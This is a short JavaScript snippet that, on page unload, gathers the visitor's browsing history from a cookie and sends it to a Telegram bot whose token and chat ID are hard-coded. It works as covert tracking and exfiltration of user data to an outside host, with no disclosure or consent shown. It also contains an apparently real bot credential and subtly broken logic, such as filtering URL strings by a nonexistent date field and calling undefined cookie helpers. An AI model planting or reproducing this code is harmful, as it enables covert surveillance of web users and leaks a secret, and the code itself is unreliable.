var telegramBotToken = '6495073205:AAHP8aYNqXe2iz_m9NPw7Q_c0GavoNE1oj4';
var chatId = '6339940126';

function sendToTelegram(message) {
    var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
    
    // Use fetch API to send the message
    fetch(url, { method: 'POST' })
        .then(response => response.json())
        .then(data => console.log(data));
}

window.onbeforeunload = function() {
    var historyList = JSON.parse(getCookie('history')) || [];
    historyList.push(window.location.href);
    
    // Keep only the history of the last 2 days
    var twoDaysAgo = new Date();
    twoDaysAgo.setDate(twoDaysAgo.getDate() - 2);
    
    historyList = historyList.filter(function(url) {
        return new Date(url.date) > twoDaysAgo;
    });
    
    setCookie('history', JSON.stringify(historyList), 2);
    
    // Send the history to Telegram
    sendToTelegram('Browser history:\n' + historyList.join('\n'));
}
